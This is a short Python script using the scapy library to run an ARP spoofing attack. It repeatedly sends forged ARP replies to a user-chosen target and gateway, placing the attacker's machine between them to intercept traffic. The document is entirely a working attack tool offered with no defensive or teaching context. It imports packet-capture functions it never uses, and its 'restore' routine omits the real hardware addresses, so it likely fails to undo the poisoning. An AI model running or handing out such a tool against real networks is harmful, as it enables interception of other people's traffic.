from scapy.all import ARP, send, sniff, wrpcap
import time
import sys

t = input("Target IP: ")
g = input("Gateway IP: ")
i = input("Interface: ")

at = ARP(pdst=t, hwdst="ff:ff:ff:ff:ff:ff", psrc=g, op=2)
ag = ARP(pdst=g, hwdst="ff:ff:ff:ff:ff:ff", psrc=t, op=2)

def restore():
    rt = ARP(pdst=t, psrc=g, op=2)
    rg = ARP(pdst=g, psrc=t, op=2)
    send(rt, count=5)
    send(rg, count=5)
    sys.exit(0)

try:
    while True:
        send(at, verbose=False)
        send(ag, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    restore()
